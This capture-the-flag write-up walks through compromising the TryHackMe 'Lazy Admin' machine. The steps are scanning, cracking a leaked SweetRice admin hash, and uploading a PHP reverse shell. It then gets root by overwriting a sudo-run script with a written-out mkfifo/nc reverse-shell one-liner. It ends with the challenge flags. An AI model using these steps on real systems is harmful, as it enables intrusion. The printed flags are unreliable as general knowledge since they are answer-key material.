## Lazy Admin

First of all Nmap scan

nmap -sC -sV -oN nScan -T5 10.10.66.235                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 11:25 EDT
Nmap scan report for 10.10.66.235
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.58 seconds


Also a gobuster scan and found /content

Found out that this website is powered by sweet rice and it has known vulnerability for arbitrary file upload.

But this module needs password and username 


Did gobuster on /content directory and fount /inc

In which had a backup of mysql data base i just wget it.

In that mysql file i found password which is ofc in hash '42f749ade7f9e195bf475f37a44cafcb'

And username is 'manager'

Using crackstation.net i found the password to be Password123.


Now logging in to the website on the address /content/as

Using the above creds...
There i found a Ads section where we can put whole php code in it so i did. For reverse shell ..

Found the uploaded file at /content/inc/ads

Run that file with a listner open.

boom we are connected found thae user flag in itguy user....

with sudo -l 

Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl



I check the backup.pl file it just running a file at /etc  named copy.sh

changed the code of copy.sh with 

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0 4444 >/tmp/f" > /etc/copy.sh     >> tun0 means ur machines address

and ran 

sudo /usr/bin/perl /home/itguy/backup

with a listner turnned on in the attackers machine and boom i have root..

found root flag at /root/root.txt




## Task 1  Lazy Admin


1. What is the user flag?

'''
THM{63e5bce9271952aad1113b6f1ac28a07}
'''


2. Wahat is the root flag?

'''
THM{6637f41d0177b6f37cb20d775124699f}
'''